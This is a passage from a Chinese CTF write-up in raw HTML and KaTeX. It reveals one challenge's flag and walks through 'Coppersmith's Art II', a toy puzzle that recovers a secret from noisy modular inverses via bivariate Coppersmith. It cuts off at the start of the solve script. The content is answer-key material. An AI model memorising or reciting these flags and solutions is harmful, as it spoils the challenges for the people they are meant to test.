cjk_fallback">因</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">能</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">解</span></span></span></span></p><p><code>cnss&#123;Wow!The CRT 1s S0 u5eful!&#125;</code><br />考点<code>DLP+CRT</code></p><h2 id="️-铜匠的艺术ii"><a class="markdownIt-Anchor" href="#️-铜匠的艺术ii"></a> ⚒️ 铜匠的艺术Ⅱ</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">s = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">r1, r2 = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">b1, b2 = getPrime(<span class="number">246</span>), getPrime(<span class="number">246</span>)</span><br><span class="line">d1 = inverse(s+r1, p) - b1</span><br><span class="line">d2 = inverse(s+r2, p) - b2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;p = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;d1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;d2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;r1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;r2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 151530040749164553403967983518843577352864270263889106337011110378601036680690471836027157653547709937519393960972849334865341611877035904693178333416457975524708748243011699123245181968472855540946305680746439921799620880630731896672163604054069337581059081562076860588954007665828525502756791219539357191539</span></span><br><span class="line"><span class="string">d1 = 50083234780783999664902204148367665654965860210705806460611800714011984032825099659257301169981655933116226437075588050862473758014777833755744093767631735454786283542732504816602375269658543953884652005423131768292669188376398437788186070246006877324243974392923640712035990908502571083697320506587058057087</span></span><br><span class="line"><span class="string">d2 = 91453105340363659854895114107811465809020665893141480802534401849670186432558336798544994184391985650330332142766844489480723736690400200157100330182955996913526651749892519448150014139485635391932575239621990448927615793198397632259445575664911965643266433167901384050043834029621593534439503767913891826664</span></span><br><span class="line"><span class="string">r1 = 7100211561130020745317757673987451075767374867154791943756942873384127138552062792930795789238580479594394979173335338862606838173069964831049512647184151</span></span><br><span class="line"><span class="string">r2 = 9000155708454100491902006607890753523170880329077738766151247940110441586305244492413508062919425173224196956216820961804625696491943075045460554703545531</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>时隔一年再一次出手</strong></p><p>这里除了<code>flag</code>未知，还有<strong>两个参数</strong>也未知，那么是否可以打<strong>二元copper</strong>呢？<br />所以这道题的关键是，通过题目给的两个式子<strong>消去s</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>令</mtext><mi>A</mi><mo>=</mo><msub><mi>d</mi><mn>1</mn></msub><mo>+</mo><msub><mi>b</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>B</mi><mo>=</mo><msub><mi>d</mi><mn>2</mn></msub><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">令A=d_{1}+b_{1},B=d_{2}+b_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">令</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mo>+</mo><msub><mi>r</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mi>A</mi><mo>≡</mo><mn>1</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">(s+r_{1})A\equiv 1\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mo>+</mo><msub><mi>r</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mi>B</mi><mo>≡</mo><mn>1</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">(s+r_{2})B\equiv 1\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>≡</mo><mo stretchy="false">(</mo><mi>s</mi><mo>+</mo><msub><mi>r</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">A^{-1}\equiv (s+r_{1})\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>B</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>≡</mo><mo stretchy="false">(</mo><mi>s</mi><mo>+</mo><msub><mi>r</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">B^{-1}\equiv (s+r_{2})\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>−</mo><msup><mi>B</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>≡</mo><mo stretchy="false">(</mo><msub><mi>r</mi><mn>1</mn></msub><mo>−</mo><msub><mi>r</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">A^{-1}-B^{-1}\equiv (r_{1}-r_{2})\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>其实，逆元你也可以理解为倒数吧</mtext></mrow><annotation encoding="application/x-tex">其实，逆元你也可以理解为倒数吧</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">逆</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">你</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">倒</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">吧</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>−</mo><msup><mi>B</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mfrac><mrow><mi>B</mi><mo>−</mo><mi>A</mi></mrow><mrow><mi>A</mi><mi>B</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">A^{-1}-B^{-1}=\frac{B-A}{AB}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>A</mi><mi>B</mi><mo stretchy="false">(</mo><msub><mi>r</mi><mn>1</mn></msub><mo>−</mo><mi>r</mi><mn>2</mn><mo stretchy="false">)</mo><mo>−</mo><mi>B</mi><mo>+</mo><mi>A</mi><mo>≡</mo><mn>0</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">f(x,y)=AB(r_{1}-r{2})-B+A\equiv 0\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord"><span class="mord">2</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><msub><mi>b</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>y</mi><mo>=</mo><msub><mi>b</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x=b_{1},y=b_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>≡</mo><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>−</mo><msub><mi>r</mi><mn>1</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">s\equiv A^{-1}-r_{1}\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span></span></span></span></p><p>下面简单套个模板就出了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> 